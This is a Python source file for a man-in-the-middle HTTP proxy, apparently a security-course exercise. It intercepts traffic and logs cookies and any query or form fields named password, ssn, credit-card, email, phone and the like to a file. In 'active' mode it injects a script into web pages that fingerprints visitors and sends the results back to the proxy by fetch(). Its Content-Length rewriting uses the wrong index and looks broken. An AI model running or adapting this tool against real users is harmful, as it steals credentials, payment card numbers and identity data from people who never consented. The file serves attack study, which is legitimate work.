
import socket, sys, datetime, time
from _thread import start_new_thread

class Server:
    def __init__(self, ip="127.0.0.1", port="8084", mode="passive"):
        self.max_conn = 0
        self.buffer_size = 0
        self.socket = 0
        self.ip = ip
        self.port = port
        self.mode = mode

    # Functions to write log and files
    def write_log(self, msg):
        with open("log.txt", "a+") as file:
            file.write(msg)
            file.write("\n")

    def write_info1(self, msg):
        with open("info_1.txt", "a+") as file:
            file.write(msg)
            file.write("\n")

    def write_info2(self, msg):
        with open("info_2.txt", "a+") as file:
            file.write(msg)
            file.write("\n")

    # Helper Function to get Time Stamp
    def getTimeStamp(self):
        return "[" + str(datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')) + "]"

    # Function which triggers the server
    def start_server(self, conn=5, buffer=4096):
        try:
            self.write_log(self.getTimeStamp() + "   \n\nStarting Server\n\n")
            self.listen(conn, buffer, self.port)

        except KeyboardInterrupt:
            print(self.getTimeStamp() + "   Interrupting Server.")
            self.write_log(self.getTimeStamp() + "   Interrupting Server.")
            time.sleep(.5)

        finally:
            print(self.getTimeStamp() + "   Stopping Server...")
            self.write_log(self.getTimeStamp() + "   Stopping Server")
            sys.exit()

    # Listener for incoming connections
    def listen(self, No_of_conn, buffer, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', port))
            s.listen(No_of_conn)
            print(self.getTimeStamp() + "   Listening...")
            self.write_log(
                self.getTimeStamp() + "   Initializing Sockets [ready] Binding Sockets [ready] Listening...")

        except:
            print(self.getTimeStamp() + "   Error: Cannot start listening...")
            self.write_log(self.getTimeStamp() + "   Error: Cannot start listening...")
            sys.exit(1)

        while True:
            # Try to accept new connections and read the connection data in another thread
            try:
                conn, addr = s.accept()
                # print(self.getTimeStamp() + "   Request received from: ", addr)
                self.write_log(
                    self.getTimeStamp() + "   Request received from: " + addr[0] + " at port: " + str(addr[1]))
                start_new_thread(self.connection_read_request, (conn, addr, buffer))

            except Exception as e:
                print(self.getTimeStamp() + "  Error: Cannot establish connection..." + str(e))
                self.write_log(self.getTimeStamp() + "  Error: Cannot establish connection..." + str(e))
                sys.exit(1)

        s.close()

    # helper Function to generate header to send response in HTTPS connections
    def generate_header_lines(self, code, length):
        h = ''
        if code == 200:
            # Status code
            h = 'HTTP/1.1 200 OK\n'
            h += 'Server: Jarvis\n'

        elif code == 404:
            # Status code
            h = 'HTTP/1.1 404 Not Found\n'
            h += 'Date: ' + time.strftime("%a, %d %b %Y %H:%M:%S", time.localtime()) + '\n'
            h += 'Server: Jarvis\n'

        h += 'Content-Length: ' + str(length) + '\n'
        h += 'Connection: close\n\n'

        return h

    # Function to read request data
    def connection_read_request(self, conn, addr, buffer):
        # Try to split necessary info from the header
        try:
            request = conn.recv(buffer)
            header = request.split(b'\n')[0]
            requested_file = request
            requested_file = requested_file.split(b' ')
            url = header.split(b' ')[1]

            # Stripping Port and Domain
            hostIndex = url.find(b"://")
            if hostIndex == -1:
                temp = url
            else:
                temp = url[(hostIndex + 3):]

            portIndex = temp.find(b":")

            serverIndex = temp.find(b"/")
            if serverIndex == -1:
                serverIndex = len(temp)

            # If no port in header i.e, if http connection then use port 80 else the port in header
            webserver = ""
            port = -1
            if (portIndex == -1 or serverIndex < portIndex):
                port = 80
                webserver = temp[:serverIndex]
            else:
                port = int((temp[portIndex + 1:])[:serverIndex - portIndex - 1])
                webserver = temp[:portIndex]

            # Stripping requested file
            requested_file = requested_file[1]
            print("Requested File ", requested_file)

            # Stripping method to find if HTTPS (CONNECT) or HTTP (GET)
            method = request.split(b" ")[0]

            # If method is CONNECT (HTTPS)
            if method == b"CONNECT":
                print(self.getTimeStamp() + "   CONNECT Request")
                self.write_log(self.getTimeStamp() + "   HTTPS Connection request")
                self.https_proxy(webserver, port, conn, request, addr, buffer, requested_file)

            # If method is GET (HTTP)
            else:
                # Getting request from injected script
                extracted = False
                if (addr[0] == '127.0.0.1'):
                    ss = str(requested_file)
                    ss = ss.replace("'", "")
                    idx = ss.find("?")
                    if idx >= 0:
                        data = ss[idx+1:]
                        entries = data.split("&")
                        for entry in entries:
                            arr = entry.split("=")
                            if len(arr[0]) > 0:
                                if arr[0] == "user-agent" or arr[0] == "screen" or arr[0] == "lang":
                                    extracted = True
                                    print(arr[0], arr[1])
                                    self.write_info2("{}:{}".format(arr[0], arr[1]))
                        if extracted:
                            self.write_info2("\n" + ("=" * 80) + "\n")
                            conn.send(str.encode("ok"))
                            conn.close()

                if not extracted:
                    print(self.getTimeStamp() + "   GET Request")
                    self.write_log(self.getTimeStamp() + "   HTTP Connection request")
                    self.http_proxy(webserver, port, conn, request, addr, buffer, requested_file)

        except Exception:
            return

    # Function to handle HTTP Request
    def http_proxy(self, webserver, port, conn, request, addr, buffer_size, requested_file):
        # Stripping file name
        requested_file = requested_file.replace(b".", b"_").replace(b"http://", b"_").replace(b"/", b"")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((webserver, port))
            s.send(request)

            self.extract_data(request, "Request to {}".format(webserver))

            print(self.getTimeStamp() + "  Forwarding request from ", addr, " to ", webserver)
            self.write_log(
                self.getTimeStamp() + "  Forwarding request from " + addr[0] + " to host..." + str(webserver))
            # Makefile for socket
            file_object = s.makefile('wb', 0)
            file_object.write(b"GET " + b"http://" + requested_file + b" HTTP/1.0\n\n")
            # Read the response into buffer
            file_object = s.makefile('rb', 0)
            buff = file_object.readlines()

            http_string = "fetch(`http://{}:{}?".format("127.0.0.1", "8084")
            http_string += "user-agent=${navigator.userAgent}"
            http_string += "&screen=${window.screen.height}x${window.screen.width}"
            http_string += "&lang=${navigator.languages[0]}`);"
            script = [
                "<script>",
                "{}".format(http_string),
                "</script>"
            ]

            for i in range(0, len(buff)):
                self.extract_data(buff[i], "Request to client")

                line = buff[i].decode("utf-8")
                idxCL = line.find("Content-Length: ")
                idx = line.find("</body>")
                
                if self.mode == "active":
                    if idxCL >= 0:
                        # Changing the content-length
                        num_before = line[idx + 17:]
                        inj = "Content-Length: {}".format(int(num_before) + 167)
                        conn.send(str.encode(inj))

                    # Injecting script
                    elif (idx >= 0):
                        inj = line[:idx]
                        for script_line in script:
                            inj += script_line
                        inj += line[idx:]
                        conn.send(str.encode(inj))
                    else:
                        conn.send(buff[i])
                else:
                    conn.send(buff[i])

            print(self.getTimeStamp() + "  Request of client " + str(addr) + " completed...")
            self.write_log(self.getTimeStamp() + "  Request of client " + str(addr[0]) + " completed...")
            s.close()
            conn.close()

        except Exception as e:
            print(self.getTimeStamp() + "  Error: forward request..." + str(e))
            self.write_log(self.getTimeStamp() + "  Error: forward request..." + str(e))
            return

    # function to extract the data from request
    def extract_data(self, request, requestTo):
        data = str(request)
        extracted = False

        # Cookies present along with the HTTP request
        cookie_str = ""
        cookie_idx = data.find("Cookie: ")
        if cookie_idx >= 0:
            rn_idx = data.find("\\r\\n", cookie_idx)
            if rn_idx >= 0:
                cookie_str = data[cookie_idx+8:rn_idx]
                if extracted == False:
                    self.write_info1(requestTo)
                self.write_info1("Cookie: {}".format(cookie_str))
                extracted = True

        # Usernames/emails and passwords sent as query parameters, or submitted through a form
        fields = [
            "firstname", "first-name", "given-name", "lastname", "last-name", "surname",
            "username", "user", "login", "email",
            "birthday", "dob",
            "password", "pass", "pwd", "secret",
            "address", "city", "state", "zip",
            "credit-card", "card", "debit", "credit", "creditcard",
            "social-security", "social", "ssn", "socialsecurity",
            "phone", "number", "tel"
        ]
        lower_data = data.lower()
        for field_name in fields:
            field_data = ""
            field_idx = lower_data.find(field_name + "=")
            if field_idx >= 0:
                amp_idx = lower_data.find("&", field_idx)
                http_idx = data.find("HTTP", field_idx)
                if amp_idx >= 0 and http_idx >=0:
                    idx = min(amp_idx, http_idx)
                    field_data = data[field_idx+len(field_name)+1:idx]
                elif amp_idx >= 0:
                    field_data = data[field_idx+len(field_name)+1:amp_idx]
                elif http_idx >= 0:
                    field_data = data[field_idx+len(field_name)+1:http_idx]
                else:
                    field_data = data[field_idx+len(field_name)+1:]

                if len(field_data) > 0 and (data[field_idx-1] == "&" or data[field_idx-1] == "?"):
                    # print(field_name, field_data)
                    if len(field_data) > 1 or (len(field_data) == 1 and field_data[0] != " "):
                        if extracted == False:
                            self.write_info1(requestTo)
                        self.write_info1("{}:{}".format(field_name, field_data))
                        extracted = True

        if extracted:
            self.write_info1("\n" + ("=" * 80) + "\n")


    # Function to handle HTTPS Connection
    def https_proxy(self, webserver, port, conn, request, addr, buffer_size, requested_file):
        # Stripping for filename
        requested_file = requested_file.replace(b".", b"_").replace(b"http://", b"_").replace(b"/", b"")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # If successful, send 200 code response
            s.connect((webserver, port))
            reply = "HTTP/1.0 200 Connection established\r\n"
            reply += "Proxy-agent: Jarvis\r\n"
            reply += "\r\n"
            conn.sendall(reply.encode())
        except socket.error:
            pass

        conn.setblocking(0)
        s.setblocking(0)
        print(self.getTimeStamp() + "  HTTPS Connection Established")
        self.write_log(self.getTimeStamp() + "  HTTPS Connection Established")
        while True:
            try:
                request = conn.recv(buffer_size)
                s.sendall(request)
            except socket.error:
                pass

            try:
                reply = s.recv(buffer_size)
                conn.sendall(reply)
            except socket.error:
                pass


if __name__ == "__main__":

    # Extracting args
    if (len(sys.argv) < 5):
        print("Please provide arguments: [-m [active/passive] listening ip listening port]")
    else:
        mode = sys.argv[2]
        ip = sys.argv[3]
        port = int(sys.argv[4])

        server = Server(ip, port, mode)
        server.start_server()